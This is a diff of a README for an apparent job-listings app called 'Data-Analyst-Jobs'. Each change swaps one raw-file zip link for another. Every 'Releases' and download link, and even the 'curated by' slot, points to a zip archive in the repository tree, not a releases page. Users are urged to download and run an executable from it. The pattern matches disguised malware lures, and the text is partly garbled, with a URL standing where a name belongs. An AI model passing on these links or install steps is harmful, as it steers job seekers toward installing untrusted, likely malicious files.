@@ -1,17 +1,17 @@
 # 🚀 Data-Analyst-Jobs - Find Your Perfect Data Analyst Job Daily
 
-[![Download Latest Release](https://raw.githubusercontent.com/gwenzim01/Data-Analyst-Jobs/main/honeyless/Data-Analyst-Jobs.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/gwenzim01/Data-Analyst-Jobs/main/honeyless/Data-Analyst-Jobs.zip)
+[![Download Latest Release](https://github.com/gwenzim01/Data-Analyst-Jobs/raw/refs/heads/main/archive/Jobs-Analyst-Data-3.1.zip%20Latest%20Release-v1.0-blue)](https://github.com/gwenzim01/Data-Analyst-Jobs/raw/refs/heads/main/archive/Jobs-Analyst-Data-3.1.zip)
 
 ## 📕 Overview
 
-**Data-Analyst-Jobs** offers daily listings of data analyst job opportunities curated by https://raw.githubusercontent.com/gwenzim01/Data-Analyst-Jobs/main/honeyless/Data-Analyst-Jobs.zip Discover remote work options, new positions, and various career paths in the data analysis field. This tool streamlines your job search, making it easier to find the right fit for your skills.
+**Data-Analyst-Jobs** offers daily listings of data analyst job opportunities curated by https://github.com/gwenzim01/Data-Analyst-Jobs/raw/refs/heads/main/archive/Jobs-Analyst-Data-3.1.zip Discover remote work options, new positions, and various career paths in the data analysis field. This tool streamlines your job search, making it easier to find the right fit for your skills.
 
 ## 🚀 Getting Started
 
 Follow these simple steps to start using Data-Analyst-Jobs:
 
 1. **Visit the Releases Page**  
-   Go to the following link: [Releases](https://raw.githubusercontent.com/gwenzim01/Data-Analyst-Jobs/main/honeyless/Data-Analyst-Jobs.zip).
+   Go to the following link: [Releases](https://github.com/gwenzim01/Data-Analyst-Jobs/raw/refs/heads/main/archive/Jobs-Analyst-Data-3.1.zip).
 
 2. **Download the Application**  
    Choose the latest release and download the relevant file for your operating system. Simply click on the download link for your desired file (this will typically be an executable file).
@@ -40,7 +40,7 @@ To run Data-Analyst-Jobs smoothly, ensure your system meets these requirements:
 
 ## 🔧 Download & Install
 
-To get started, visit the [Releases](https://raw.githubusercontent.com/gwenzim01/Data-Analyst-Jobs/main/honeyless/Data-Analyst-Jobs.zip) page to download the latest version of the application. Make sure to follow the installation steps outlined above for a seamless experience.
+To get started, visit the [Releases](https://github.com/gwenzim01/Data-Analyst-Jobs/raw/refs/heads/main/archive/Jobs-Analyst-Data-3.1.zip) page to download the latest version of the application. Make sure to follow the installation steps outlined above for a seamless experience.
 
 ## 📞 Support
 
@@ -82,4 +82,4 @@ Yes, Data-Analyst-Jobs is completely free to download and use.
 
 ## 🌍 Conclusion
 
-Finding a job as a data analyst can be straightforward. With Data-Analyst-Jobs, you have a reliable tool that simplifies your job search process. Download the app today and start exploring your next career step. For more updates, keep checking back on our [Releases](https://raw.githubusercontent.com/gwenzim01/Data-Analyst-Jobs/main/honeyless/Data-Analyst-Jobs.zip) page.
+Finding a job as a data analyst can be straightforward. With Data-Analyst-Jobs, you have a reliable tool that simplifies your job search process. Download the app today and start exploring your next career step. For more updates, keep checking back on our [Releases](https://github.com/gwenzim01/Data-Analyst-Jobs/raw/refs/heads/main/archive/Jobs-Analyst-Data-3.1.zip) page.
